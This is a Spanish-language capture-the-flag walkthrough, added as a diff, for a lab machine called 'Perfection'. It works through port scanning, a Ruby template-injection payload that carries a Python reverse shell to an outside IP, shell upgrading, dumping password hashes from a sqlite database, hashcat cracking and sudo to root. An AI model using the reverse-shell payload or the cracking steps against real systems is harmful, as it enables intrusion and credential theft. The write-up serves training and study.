@@ -1,0 +1,144 @@
+---
+title: Perfection
+banner: /avatars/perfection.webp
+difficulty: easy
+os: linux
+releaseDate: 2024-03-02
+slug: "perfection"
+isPublished: false
+---
+
+
+import Browser from "@/components/Browser.astro" 
+
+## Enumeration
+
+Comenzaremos por un escaneo de puertos con nmap para ver que servicios tiene expuestos al exterior.
+
+```bash
+sudo nmap -p- -n -Pn --disable-arp-ping -sS -sV -sC -vvv -T5 10.10.11.253 -oN Perfection.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 nginx
+```
+
+Una vez escaneada la maquina vemos que tiene un servicio web corriendo por lo que entramos a la web y navegando por ella llegamos a lo que viene a ser un formularip para calcular la nota media de un alumno.
+
+<Browser
+  url="10.10.11.253/"
+  src="/walkthroughs/perfection/0.png"
+/>
+
+## Exploitation
+
+Abrimos burpsuite, capturamos la petición y la mandamos al repeater.
+
+Una vez ahi decido probar varios payloads para primero ver que caracteres esta filtrando y posteriormente intentar colar un revershell. Para realizar estas pruebas me baso en algunos payloads de [hacktricks] así como que la tecnologia que hay detras tiene pinta de ser Ruby. 
+
+tras varios intentos, consigo RCE en la maquina cuelo una revershell mediante el siguiente payload en el campo de categoria:
+
+```
+category%0a<%25%3d+`python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.199",5000))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("bash")'`+%25>
+```
+
+> Nota: El payload ya esta con el encode para url en los caracteres clave gracias a burpsuite.
+
+```bash
+nc -lvnp 5000
+```
+
+```bash
+susan@perfection:~/ruby_app$ cat ~/user.txt
+bfd33f2d5e72f0e6de3699e3bf0004bc
+```
+
+## Post Exploitation
+
+Siguiendo esta [guía](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys) mejoramos nuestra shell para que sea completamente interactiva y podamos trabajar más comodamente.
+
+```bash
+script /dev/null -qc /bin/bash 
+```
+
+(inside the nc session) `CTRL+Z`
+
+```bash
+stty raw -echo; fg
+```
+
+(inside the nc session) 
+```bash
+reset xterm
+```
+
+(inside the nc session) 
+```bash
+export SHELL=/bin/bash; 
+export TERM=screen; 
+stty rows 38 columns 116;
+reset;
+```
+
+##  Privilege escalation
+
+haciendo `ls` en el home del usuario, podemos ver que hay una carpeta llamada Migration en cuyo interior hay un fichero que tras aplicar la herramienta file podemos ver que es una base de datos sqlite3
+
+```bash
+susan@perfection:~/Migration$ ls
+pupilpath_credentials.db
+susan@perfection:~/Migration$ file pupilpath_credentials.db 
+pupilpath_credentials.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 6, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 6
+```
+
+a continuacion procedo a hacer un poco de enumeracion dentro de esta base de datos obteniendo:
+
+```bash
+susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+users
+sqlite> select * from users;
+1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
+2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
+3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
+4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
+5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
+```
+
+parecen ser los usuarios y contraseñas de los alumnos. para confirmar, decido ver el nombre de las columnas:
+
+```bash
+sqlite> PRAGMA table_info(users);
+0|id|INTEGER|0||1
+1|name|TEXT|0||0
+2|password|TEXT|0||0
+```
+
+según chatgpt, el formato del hash parece ser un SHA256 y si miramos el mail aparece un correo indicando que las nuevas contraseñas van a seguir el formato:
+
+```
+```
+
+a continuacion, procedo a ejecutar hashcat para crackear el hash de nuestro usuario `susan` y así pode escalar privilegios.
+
+```bash
+hashcat -a 3 -m 1400 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f "susan_nasus_?d?d?d?d?d?d?d?d?d" --show 
+abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
+```
+
+```bash
+susan@perfection:/var/mail$ sudo -l
+[sudo] password for susan: 
+Matching Defaults entries for susan on perfection:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User susan may run the following commands on perfection:
+    (ALL : ALL) ALL
+susan@perfection:/var/mail$ sudo bash
+root@perfection:~# cat ~/root.txt 
+ea927a4fe65ba5eaf2323d5b7d22a061
+```
